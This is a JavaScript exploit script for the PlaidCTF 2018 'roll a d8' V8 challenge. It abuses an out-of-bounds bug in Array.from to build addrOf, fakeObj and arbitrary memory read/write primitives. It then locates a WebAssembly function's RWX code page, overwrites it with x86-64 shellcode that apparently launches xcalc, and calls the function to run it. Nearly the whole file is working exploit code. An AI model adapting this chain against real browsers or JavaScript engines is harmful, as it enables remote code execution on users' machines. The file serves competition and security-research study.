/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2019-12-15 00:47:59
 * Author: raycp
 * 
 * Last Modified: 2019-12-15 04:57:13
 * Description: exp for plaidctf 2018 roll a d8, oob for array.form
************************************************************/
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}

func = wasm_func();

// step 1 trigger the vuln.
var oobArray = [1.1];
var obj = [];
var data_buf = [];
var maxSize = 1028 * 8;
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
      counter : 0,
      next() {
          let result = this.counter++;
          if (this.counter > maxSize) {
              oobArray.length = 1;
              // push the wasm code object and ArrayBuffer behind the oobArray.
              oobArray[0] = 1.1;
              data_buf.push(new ArrayBuffer(0x200));
              let o = {a:i2f(0xdeadbeef), b:func};
              obj.push(o);
              return {done: true};
          } else {
              return {value: result, done: false};
          }
      }
  }
) });

// console.log("oobArray length: "+oobArray.length);
//%DebugPrint(data_buf);

function gc()
{
    for(let i=0;i<0x10;i++)
    {
        new Array(0x1000000);
    }
}

gc();


//%DebugPrint(oobArray);
//%DebugPrint(obj);
//%SystemBreak();
// step 2, looking for obj.b:func offset in oobArray
var float_object_idx = 0;
for(let i=0; i<maxSize; i++) {
    if(f2i(oobArray[i]) == 0xdeadbeef) {
        float_object_idx = i + 1;
        console.log("float idx of object is: 0x"+hex(float_object_idx));
        break;
    }
} 
//console.log(oobArray[float_object_idx-1]);
// step 3, looking for backing_stroe in data_buf
var float_array_buf_idx = 0;
for(let i=0; i<maxSize; i++) {
    if(f2i(oobArray[i]) == 0x0000020000000000) {
        float_array_buf_idx = i + 1;
        console.log("float idx of array buf backing store is: 0x"+hex(float_array_buf_idx));
        break;
    }
}
//console.log(hex(f2i(oobArray[float_array_buf_idx-1])));

var data_view = new DataView(data_buf[0]);

// step 4, build addrOf primitive 
function addrOf(obj_para)
{
    obj[0].b=obj_para;
    return f2i(oobArray[float_object_idx]) - 1;
}

// step 5, build fakeObj primitive
function fakeObj(fake_obj_addr)
{
    oobArray[float_object_idx] = i2f(fake_obj_addr);
    return obj[0].b;
}

// step 6, build aar primitive
function dataview_read64(addr)
{
    oobArray[float_array_buf_idx]=i2f(addr);
    return f2i(data_view.getFloat64(0, true));
}

// step 7, build aaw primitive
function dataview_write64(addr, value)
{
    oobArray[float_array_buf_idx] = i2f(addr);
    return data_view.setFloat64(0, f2i(value), True);
}

function dataview_write(addr, payload)
{
    oobArray[float_array_buf_idx] = i2f(addr);
    for(let i=0; i<payload.length; i++) {
        data_view.setUint8(i, payload[i]);
    }
    return ;
}

// %DebugPrint(func.shared_info);
// %SystemBreak();
// step 8, get the JSFunction addr with addrOf primitive
var wasm_obj_addr = addrOf(func);
var shared_info_addr = dataview_read64(wasm_obj_addr+0x18)-1;
var code_addr = dataview_read64(shared_info_addr+8)-1;
var rwx_addr = (dataview_read64(code_addr+0x72));
//console.log("wasm code stored in addr: 0x"+hex(wasm_store_code_addr));
console.log("wasm obj addr: 0x"+hex(wasm_obj_addr));
console.log("wasm shared info addr: 0x"+hex(shared_info_addr));
console.log("wasm code addr: 0x"+hex(code_addr));
console.log("rwx addr: 0x"+hex(rwx_addr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
// step 9 wite the shellcode to wasm code
dataview_write(rwx_addr, shellcode);
// step 10, trigger wasm code and execute shellcode
func();
